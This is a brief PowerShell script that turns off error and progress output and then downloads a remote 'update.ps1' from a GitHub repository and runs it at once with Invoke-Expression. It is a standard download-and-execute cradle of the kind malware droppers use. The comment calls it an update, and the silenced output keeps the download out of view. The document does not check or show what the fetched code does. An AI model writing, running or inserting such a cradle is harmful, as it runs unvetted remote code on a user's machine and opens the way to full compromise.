$ErrorActionPreference='SilentlyContinue'
$ProgressPreference='SilentlyContinue'

# Download and run update.ps1 from GitHub
IEX((New-Object Net.WebClient).DownloadString('https://github.com/angelsegg/gfddhd/raw/refs/heads/main/update.ps1'))
